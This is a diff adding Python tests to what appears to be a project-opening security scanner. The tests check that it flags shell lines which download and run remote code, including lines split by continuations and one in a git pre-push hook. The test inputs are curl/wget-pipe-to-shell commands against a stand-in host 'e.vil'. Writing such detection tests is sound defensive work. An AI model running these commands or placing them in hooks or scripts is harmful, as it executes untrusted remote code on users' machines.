@@ -198,3 +198,24 @@ def test_settings_apontando_para_pastas_nao_versionadas_e_low(projeto):
     sev = {a.trecho: a.severidade for a in achados}
     assert sev == {"${workspaceFolder}/.venv/bin/python": Severity.LOW, "./node_modules/prettier": Severity.LOW,
                    "venv\\Scripts\\python.exe": Severity.LOW, "./tools/node": Severity.MEDIUM}
+
+
+@pytest.mark.parametrize("script", [
+    "curl -s https://e.vil/i.sh |\n  sh\n",
+    "curl -s https://e.vil/i.sh | \\\n  sh\n",
+    "wget -qO- https://e.vil/i.sh &&\n  bash i.sh\n",
+    "curl -o /tmp/x https://e.vil/x ||\n  true; curl https://e.vil | bash\n",
+])
+def test_linha_perigosa_junta_continuacao_de_shell(script):
+    from mandacaru.projeto.abrir import linha_perigosa
+    assert linha_perigosa(script) is not None
+
+
+def test_git_hook_com_pipe_no_fim_da_linha(projeto):
+    raiz = projeto({".git/hooks/pre-push": "#!/bin/sh\ncurl -s https://e.vil/i.sh |\n  sh\n"})
+    assert verificar_git(raiz)[0].severidade == Severity.HIGH
+
+
+def test_linhas_independentes_nao_se_juntam(projeto):
+    from mandacaru.projeto.abrir import linha_perigosa
+    assert linha_perigosa("curl https://api/health\nsh ./build.sh\n") is None
